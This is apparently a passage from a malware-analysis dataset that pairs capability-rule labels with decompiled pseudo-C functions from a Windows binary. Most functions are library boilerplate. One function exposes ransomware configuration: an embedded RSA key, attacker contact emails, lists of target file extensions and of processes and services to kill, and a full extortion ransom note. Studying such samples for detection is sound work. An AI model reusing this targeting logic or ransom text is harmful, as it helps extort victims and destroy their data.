return;\n}\n",
        "token_count": 453
    },
    "00435c2d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00435c2d(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495310;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.004361c6(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495310 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "0043d49f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0043d49f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t arg_8h;\n    uint var_10h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    if (iVar2 != -1) {\n        return;\n    }\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < arg_8h) {\n        arg_8h = arg_8h & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 180
    },
    "0044741b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0044741b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint32_t arg_8h_00;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar6;\n    uint var_40h;\n    uint var_34h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    uint uVar7;\n    \n    uVar7 = 0x34;\n    fcn.0043ad3e();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    iVar5 = fcn.0043a4f7(0x28, uVar7);\n    uVar6 = 0;\n    arg_ch_00 = 0x28;\n    *(unaff_EBP + -0x1c) = iVar5;\n    *extraout_ECX = iVar5;\n    *(unaff_EBP + -4) = 0;\n    fcn.00451500(iVar5, 0x4910b8);\n    do {\n        if (*(unaff_EBP + 8) <= uVar6) {\n            iVar5 = **(unaff_EBP + -0x18);\n            if (((*(iVar5 + 4) == 0xffffffff) || (*(iVar5 + 8) == -1)) || (*(iVar5 + 8) <= *(iVar5 + 4))) {\n                fcn.00447509();\n                fcn.0043ac9c();\n                return;\n            }\n            fcn.0044552b();\n            var_4h = 0x48e6fc;\n            iVar5 = unaff_EBP + -0x40;\ncode_r0x00447502:\n            fcn.00451487(iVar5, arg_ch_00);\n            pcVar3 = swi(3);\n            (*pcVar3)(arg_ch_00, var_4h);\n            return;\n        }\n        piVar1 = *(unaff_EBP + 0xc);\n        *piVar1 = *piVar1 + 4;\n        puVar2 = *piVar1;\n        arg_8h_00 = puVar2[-1];\n        *piVar1 = puVar2 + 1;\n        uVar7 = *puVar2;\n        *(unaff_EBP + -0x14) = uVar7;\n        if (9 < arg_8h_00) {\n            var_4h = fcn.00447552(arg_8h_00);\n            fcn.00445510(var_4h);\n            arg_ch_00 = 0x48e68c;\n            iVar5 = unaff_EBP + -0x28;\n            goto code_r0x00447502;\n        }\n        arg_ch_00 = arg_8h_00;\n        cVar4 = fcn.00447569(arg_8h_00, uVar7);\n        if (cVar4 == '\\0') {\n            var_4h = fcn.00447552(arg_8h_00);\n            fcn.0044553c(var_4h);\n            arg_ch_00 = 0x48e6c4;\n            iVar5 = unaff_EBP + -0x34;\n            goto code_r0x00447502;\n        }\n        uVar6 = uVar6 + 1;\n        *(iVar5 + arg_8h_00 * 4) = *(unaff_EBP + -0x14);\n    } while( true );\n}\n",
        "token_count": 853
    },
    "0044adda": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0044adda(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *puVar1;\n    uint uVar2;\n    \n    arg_8h = arg_8h + 4;\n    arg_8h_00 = fcn.0044ae8b(arg_8h);\n    if (arg_8h_00 != -1) {\n        puVar1 = fcn.0044adc1();\n        if (puVar1 != NULL) goto code_r0x0044ae17;\n        arg_8h = *(arg_8h_00 * 4 + 0x478a48);\n    }\n    puVar1 = fcn.0046f837(arg_8h);\ncode_r0x0044ae17:\n    uVar2 = fcn.0043d5a1(arg_8h_00);\n    *puVar1 = uVar2;\n    return puVar1 + 1;\n}\n",
        "token_count": 220
    },
    "0044ae54": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ae54(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    \n    arg_8h_00 = arg_8h + -4;\n    iVar2 = fcn.0043d5a1(*arg_8h_00);\n    if ((iVar2 != -1) && (cVar1 = fcn.0044ae2a(arg_8h_00),  cVar1 != '\\0')) {\n        return;\n    }\n    fcn.0043ac97(arg_8h_00);\n    return;\n}\n",
        "token_count": 144
    },
    "0044e466": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0044e466(void)\n\n{\n    code *pcVar1;\n    uint32_t arg_8h;\n    uint var_10h;\n    \n    *0x49586c = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    if (*0x49586c != -1) {\n        return;\n    }\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < arg_8h) {\n        arg_8h = arg_8h & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 179
    },
    "004544d3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004544d3(void)\n\n{\n    int32_t iVar1;\n    \n    *0x491150 = fcn.00455507(fcn.004543e0);\n    if (*0x491150 != -1) {\n        iVar1 = fcn.004555b8(*0x491150, 0x4958c0);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        if (*0x491150 != -1) {\n            fcn.00455542(*0x491150);\n            *0x491150 = -1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "0046116d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046116d(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004610c6:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    piVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *piVar4 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.0045652e();\n                    uVar6 = 0x22;\n                    goto code_r0x004610e8;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004610c6;\n    puVar2 = fcn.0045652e();\n    uVar6 = 0x16;\ncode_r0x004610e8:\n    *puVar2 = uVar6;\n    fcn.004559dd();\n    return uVar6;\n}\n",
        "token_count": 619
    },
    "0046da9b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046da9b(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0046da10:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    pcVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if ((cVar1 == '\\0') || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *pcVar4 = '\\0';\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.0045652e();\n                    uVar6 = 0x22;\n                    goto code_r0x0046da2d;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0046da10;\n    puVar2 = fcn.0045652e();\n    uVar6 = 0x16;\ncode_r0x0046da2d:\n    *puVar2 = uVar6;\n    fcn.004559dd();\n    return uVar6;\n}\n",
        "token_count": 617
    },
    "0046f339": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.0046f339(void)\n\n{\n    if (*0x491940 == -2) {\n        fcn.0046f31a();\n    }\n    return *0x491940 != -1;\n}\n",
        "token_count": 48
    },
    "0046f358": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0046f358(void)\n\n{\n    if ((*0x491940 != -1) && (*0x491940 != -2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x491940);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "0046805a": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046805a(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x495e20));\n    return;\n}\n",
        "token_count": 69
    },
    "0046807d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046807d(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x495e20));\n    return;\n}\n",
        "token_count": 70
    },
    "0046f473": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046f473(uint8_t *arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    if (arg_8h == NULL) {\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return 1;\n    }\n    if (arg_ch == 0) {\n        *arg_8h = arg_ch;\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return 1;\n    }\n    if ((arg_ch & 0xffffff80) == 0) {\n        *arg_8h = arg_ch;\n        return 1;\n    }\n    if ((arg_ch & 0xfffff800) == 0) {\n        uVar3 = 0xc0;\n        iVar4 = 1;\n        iVar2 = iVar4;\n    }\n    else if ((arg_ch & 0xffff0000) == 0) {\n        if ((0xd7ff < arg_ch) && (arg_ch < 0xe000)) {\ncode_r0x0046f466:\n            iVar2 = fcn.0046e969(arg_10h);\n            return iVar2;\n        }\n        iVar4 = 2;\n        uVar3 = 0xe0;\n        iVar2 = iVar4;\n    }\n    else {\n        if (((arg_ch & 0xffe00000) != 0) || (0x10ffff < arg_ch)) goto code_r0x0046f466;\n        iVar4 = 3;\n        uVar3 = 0xf0;\n        iVar2 = iVar4;\n    }\n    do {\n        uVar1 = arg_ch;\n        arg_ch = arg_ch >> 6;\n        arg_8h[iVar4] = uVar1 & 0x3f | 0x80;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    *arg_8h = arg_ch | uVar3;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    return iVar2 + 1;\n}\n",
        "token_count": 506
    },
    "00402520": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.00402520(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    char16_t *pcVar3;\n    char *pcVar4;\n    uint var_148h;\n    uint var_130h;\n    uint var_118h;\n    uint var_100h;\n    uint var_e8h;\n    uint var_d0h;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_70h;\n    uint var_58h;\n    uint var_40h;\n    uint var_28h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4701c0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    pcVar4 = \n    \"BgIAAACkAABSU0ExAAgAAAEAAQBRm9aeLveQunHthSbUxVEUfJWvf34JrIO24OWd8ZfnClzJCOCN2BEVSxC1iavwRb/cIxQvycLU+kroTGABm1Td1GEWYnxf+ql2cluGZZC/5+eIVSU6gC9z6BYq/w+orhbyywwm1FGGmcPRmKB/KBv2Rl4oz6eNrbq51NQ1SDfizw1C0Mct59b+VA71MS40k1kIaSG4QgMuKPJ3QnAlcU4MmtnZyrPe9qpQEJSbo0dRo4XK7lQng1qTxeGBTT/v8RJUzcK1j5J9ipS5AcM7q6OwOxnvJouJV4vbpCjKQKfJsFJqOHCTgKcCYQkmTRF+zKSQdZ0/2O2D8gpTF/1bkPWr\"\n    ;\n    fcn.00405750(\n                \"BgIAAACkAABSU0ExAAgAAAEAAQBRm9aeLveQunHthSbUxVEUfJWvf34JrIO24OWd8ZfnClzJCOCN2BEVSxC1iavwRb/cIxQvycLU+kroTGABm1Td1GEWYnxf+ql2cluGZZC/5+eIVSU6gC9z6BYq/w+orhbyywwm1FGGmcPRmKB/KBv2Rl4oz6eNrbq51NQ1SDfizw1C0Mct59b+VA71MS40k1kIaSG4QgMuKPJ3QnAlcU4MmtnZyrPe9qpQEJSbo0dRo4XK7lQng1qTxeGBTT/v8RJUzcK1j5J9ipS5AcM7q6OwOxnvJouJV4vbpCjKQKfJsFJqOHCTgKcCYQkmTRF+zKSQdZ0/2O2D8gpTF/1bkPWr\"\n                );\n    fcn.004057c0(pcVar4, uVar1);\n    fcn.0040c130();\n    fcn.00405750(\"alfredolopes@protonmail.com or coronahelpme@nigge.rs\");\n    fcn.00403890(var_10h + 0x78, &var_28h);\n    fcn.004055f0();\n    fcn.00405750(0x4823e0);\n    fcn.00403890(var_10h + 0x90, &var_40h);\n    fcn.004055f0();\n    fcn.00405750(0x482460);\n    fcn.00403890(var_10h + 0xa8, &var_58h);\n    fcn.004055f0();\n    fcn.00405750(\n                \"AppData,Program Files,Program Files (x86),AppData,boot,PerfLogs,ProgramData,Google,Intel,Microsoft,Application Data,Tor Browser,Windows\"\n                );\n    fcn.00403670(var_10h + 0xc0, &var_70h, 0x2c);\n    fcn.004055f0();\n    fcn.00405750(\".exe,.dll,.sys,.ini,.ako,.key\");\n    fcn.00403670(var_10h + 0xcc, &var_88h, 0x2c);\n    fcn.004055f0();\n    fcn.00405750(\n                \".arm,.acr,.arz,.bck,.bak,.cnf,.dbs,.ddl,.frm,.ibd,.ism,.mrg,.mdf,.mds,.frm,.myd,.myi,.mysql,.opt,.phl,.sal,.sqr,.tmd,.ibz,.ibc,.pptx,.pptm,.ppt,.potx,.potm,.qbquery,.rul,.qbw,.qbmb,.qbb,.qbm,.qbo,.des,.qbr,.qwc,.qbx,.qba,.qby,.qbj,.tlg,.xlc,.zip,.rar,.ldf,.avhd,.vhd,.vsv,.vmrs,.vmcx,.vhdx,.iso\"\n                );\n    fcn.00403670(var_10h + 0xd8, &var_a0h, 0x2c);\n    fcn.004055f0();\n    fcn.00405750(\n                \"winword.exe,visio.exe,encsvc.exe,mysqld_opt.exe,ocssd.exe,thebat.exe,ocomm.exe,outlook.exe,onenote.exe,sqlwriter.exe,msaccess.exe,mysqld.exe,sqlagent.exe,sqlservr.exe,infopath.exe,sqlbrowser.exe,thunderbird.exe,msftesql.exe,wordpad.exe,synctime.exe,agntsvc.exe,dbsnmp.exe,mydesktopservice.exe,ocautoupds.exe,thebat64.exe,sqbcoreservice.exe,isqlplussvc.exe,oracle.exe,tbirdconfig.exe,mysqld_nt.exe\"\n                );\n    fcn.00403670(var_10h + 0xe4, &var_b8h, 0x2c);\n    fcn.004055f0();\n    fcn.00405750(\n                \"vmickvpexchange,vmicguestinterface,vmicshutdown,vmicheartbeat,MSSQLFDLauncher,MSSQLSERVER,SQLBrowser,SQLSERVERAGENT,SQLWriter,MSSQL,WRSVC,ekrn\"\n                );\n    fcn.00403670(var_10h + 0xf0, &var_d0h, 0x2c);\n    fcn.004055f0();\n    fcn.00405750(\"false\");\n    fcn.00403890(var_10h + 0xfc, &var_e8h);\n    fcn.004055f0();\n    fcn.00405750(\"backup\");\n    fcn.00403670(var_10h + 0x114, &var_100h, 0x2c);\n    fcn.004055f0();\n    fcn.00405750(0x482354);\n    fcn.00403890(var_10h + 0x120, &var_118h);\n    fcn.004055f0();\n    fcn.00405090(L\"99 1 33 44 22 13\");\n    pcVar3 = L\"_id.key\";\n    arg_8h = &var_148h;\n    uVar2 = fcn.00403490(arg_8h);\n    uVar2 = fcn.00407970(&var_130h, L\"do_not_remove_ako\", uVar2);\n    fcn.004079b0(var_10h + 0x150, uVar2, arg_8h);\n    fcn.00404f30(pcVar3);\n    fcn.00404f30();\n    fcn.00405090(L\"Ako-ReadMe.txt\");\n    fcn.00405750(\n                \"Your network has been hacked and locked.\\r\\n\\r\\nAll files on each host in the network have been encrypted with a strong algorithm.\\r\\n\\r\\nBackups were either encrypted or deleted or backup disks were formatted.\\r\\nShadow copies also removed. Any 3rd party software may damage encrypted data but not recover.\\r\\n\\r\\nAlso, we have gathered all your private sensitive data.\\r\\nSome sensetive information stolen from the file servers will be disclosed to public or sold if you decide not contact to us.\\r\\nIt will harm your business reputation.\\r\\n\\r\\nWe have decryption software for your situation.\\r\\nNo decryption software is available in the public.\\r\\n\\r\\nDO NOT RESET OR SHUTDOWN - files may be damaged.\\r\\nDO NOT RENAME OR MOVE the encrypted and readme files.\\r\\nDO NOT DELETE readme files.\\r\\n\\r\\nTo confirm our honest intentions, send 3 different random files and you will get it decrypted.\\r\\nIt can be from different computers on your network to be sure that one key decrypts everything. \\r\\n\\r\\nTo get info (decrypt your files) contact us at (email) and send your key (see it below)\\r\\n{UID}\\r\\n\\r\\nThe faster you get in contact - the lower price you can expect.\\r\\n\\r\\nClient ID: {EXT} \\r\\nKey: {PATTERN_ID}\"\n                );\n    *in_FS_OFFSET = var_ch;\n    return var_10h;\n}\n",
        "token_count": 2207
    },
    "00402830": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00402830(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004055f0(param_1);\n    fcn.00404f30();\n    fcn.00404f30();\n    fcn.00404f30();\n    fcn.00404f30();\n    fcn.004049d0();\n    fcn.00404f30();\n    fcn.004049d0();\n    fcn.004049d0();\n    fcn.004049d0();\n    fcn.004049d0();\n    fcn.004049d0();\n    fcn.00404f30();\n    fcn.00404f30();\n    fcn.00404f30();\n    fcn.0040c220();\n    fcn.004055f0();\n    fcn.004055f0();\n    return;\n}\n",
        "token_count": 209
    },
    "00403490": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403490(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint in_stack_ffffff6c;\n    uint var_70h;\n    uint var_58h;\n    uint var_40h;\n    uint var_28h;\n    uint var_21h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_21h._0_1_ = 0;\n    fcn.0040c350(&var_21h + 1);\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(&var_21h + 1);\n        uVar2 = fcn.004035a0(&var_40h, uVar2);\n        uVar2 = fcn.00401440(uVar2);\n        fcn.00405010(uVar2);\n        fcn.00404f30();\n        fcn.004055f0();\n    }\n    else {\n        uVar2 = fcn.0040c250(&var_58h, 7);\n        fcn.00405640(uVar2);\n        fcn.004055f0();\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            uVar2 = fcn.00401440(&var_21h + 1);\n            fcn.0040c3f0(uVar2);\n        }\n        uVar2 = fcn.00401440(&var_21h + 1);\n        uVar2 = fcn.004035a0(&var_70h, uVar2);\n        in_stack_ffffff6c = fcn.00401440(uVar2);\n        fcn.00405010(in_stack_ffffff6c);\n        fcn.00404f30();\n        fcn.004055f0();\n    }\n    fcn.0043a2e7(in_stack_ffffff6c);\n    return;\n}\n",
        "token_count": 474
    },
    "0040c130": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c130(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint8_t var_fh;\n    uint8_t var_eh;\n    uint8_t var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004057c0(uVar1);\n    fcn.004057c0();\n    fcn.004057c0();\n    arg_8h = fcn.0040c110(0);\n    fcn.00456562(arg_8h);\n    for (var_dh = 0x61; var_dh < 0x7b; var_dh = var_dh + 1) {\n        fcn.0040c5a0(var_dh);\n    }\n    for (var_eh = 0x41; var_eh < 0x5b; var_eh = var_eh + 1) {\n        fcn.0040c5a0(var_eh);\n    }\n    for (var_fh = 0x30; var_fh < 0x3a; var_fh = var_fh + 1) {\n        fcn.0040c5a0(var_fh);\n    }\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 367
    },
    "0040c220": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040c220(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004055f0(param_1);\n    fcn.004055f0();\n    fcn.004055f0();\n    return;\n}\n",
        "token_count": 75
    },
    "0040c540": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0040c540(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00456541(uVar2);\n    uVar3 = fcn.00404d90();\n    puVar4 = fcn.00405270(uVar2 % uVar3);\n    uVar1 = *puVar4;\n    *in_FS_OFFSET = var_ch;\n    return puVar4 & 0xffffff00 | uVar1;\n}\n",
        "token_count": 222
    },
    "00449c2c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00449c2c(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    iVar4 = (arg_8h >> 5) * 4;\n    uVar3 = 1 << (arg_8h & 0x1f);\n    uVar1 = *(*(in_ECX + 0x58) + iVar4) & uVar3;\n    if (uVar1 != 0) {\n        puVar2 = *(in_ECX + 0x58) + iVar4;\n        LOCK();\n        *puVar2 = *puVar2 & ~uVar3;\n    }\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 196
    },
    "0044ab04": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044ab04(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.00442d5d();\n    piVar4 = iVar1 + 0x9c;\n    if (iVar1 == 0) {\n        piVar4 = 0xa0;\n    }\n    uVar2 = fcn.00443e8a(*param_1 + 4);\n    if (uVar2 != '\\0') {\n        uVar3 = 1;\n        uVar2 = 1 << (*(*piVar4 + 0x90) & 0x1f);\n        if ((*(*(*param_1 + 8) + (*(*piVar4 + 0x90) >> 5) * 4) & uVar2) == 0) goto code_r0x0044ab54;\n    }\n    uVar3 = 0;\ncode_r0x0044ab54:\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 256
    },
    "004667b3": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004667b3(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.0043b410();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00456afa(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x49106c & 0x1f;\n    *(unaff_EBP + -0x1c) = (*0x49106c ^ *0x496100) >> uVar1 | (*0x49106c ^ *0x496100) << 0x20 - uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00466801(0x48f2b8, noname_1, unaff_retaddr);\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 275
    },
    "004090a0": {
        "rules": [
